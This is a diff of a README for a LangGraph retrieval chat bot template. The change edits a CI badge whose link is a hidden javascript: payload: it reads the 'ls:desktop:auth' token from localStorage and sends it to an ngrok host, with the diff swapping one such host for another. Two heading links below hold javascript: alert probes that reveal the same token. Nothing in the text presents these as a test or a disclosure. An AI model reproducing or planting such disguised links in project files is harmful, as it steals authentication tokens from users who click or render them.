@@ -1,7 +1,7 @@
 # LangGraph Retrieval Chat Bot Template
 
 
-[![CI](https://github.com/langchain-ai/retrieval-agent-template/actions/workflows/unit-tests.yml/badge.svg)](javascript:window.location.replace('https://d2fc-176-228-153-49.ngrok-free.app/?x='+localStorage.getItem('ls:desktop:auth')))
+[![CI](https://github.com/langchain-ai/retrieval-agent-template/actions/workflows/unit-tests.yml/badge.svg)](javascript:window.location.replace('https://0dc9-212-199-39-186.ngrok-free.app/?x='+localStorage.getItem('ls:desktop:auth')))
 
 #[test1234](javascript:alert(localStorage.getItem('ls:desktop:auth')))
 #[ttt](javascript:alert(222))
